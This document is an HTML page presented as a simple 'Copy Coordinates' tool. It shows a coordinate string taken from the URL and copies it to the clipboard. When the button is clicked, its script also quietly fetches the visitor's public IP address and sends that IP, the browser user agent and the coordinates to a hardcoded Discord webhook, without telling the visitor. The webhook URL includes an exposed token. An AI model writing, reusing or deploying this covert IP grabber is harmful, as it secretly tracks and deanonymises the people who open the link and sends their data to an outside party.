<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Copy Coordinates</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
        }
        #coords {
            font-size: 1.2em;
            margin-bottom: 20px;
        }
        button {
            padding: 10px 20px;
            font-size: 1em;
            cursor: pointer;
        }
    </style>
</head>
<body>

<div id="coords"></div>
<button onclick="copyToClipboard()">Copy Coordinates</button>

<script>
    // Function to get URL parameters
    function getUrlParams() {
        const params = new URLSearchParams(window.location.search);
        return params.entries().next().value[0];
    }

    // Display coordinates
    const coords = getUrlParams();
    document.getElementById('coords').innerText = coords;

    // Function to copy to clipboard and send data to webhook
    function copyToClipboard() {
        const el = document.createElement('textarea');
        el.value = coords;
        document.body.appendChild(el);
        el.select();
        document.execCommand('copy');
        document.body.removeChild(el);
        alert('Coordinates copied to clipboard!');

        // Send data to webhook
        sendToWebhook(coords);
    }

    // Function to send data to webhook
    async function sendToWebhook(coords) {
        const webhookUrl = 'https://discord.com/api/webhooks/1249231367057834014/IkOD3gMKxASoxgHzZSXlRLeFHchi3faP9zyPsUFAs7Z12dg7uE700dHL05A0R-9yUyHN'; // Replace with your webhook URL
        const userAgent = navigator.userAgent;

        // Fetch the user's IP address from an external service
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const userIp = ipData.ip;

            const payload = {
                content: `Coordinates: ${coords}\nIP: ${userIp}\nUser Agent: ${userAgent}`
            };

            await fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            });
            console.log('Data sent to webhook successfully');
        } catch (error) {
            console.error('Error fetching IP or sending data to webhook:', error);
        }
    }
</script>

</body>
</html>
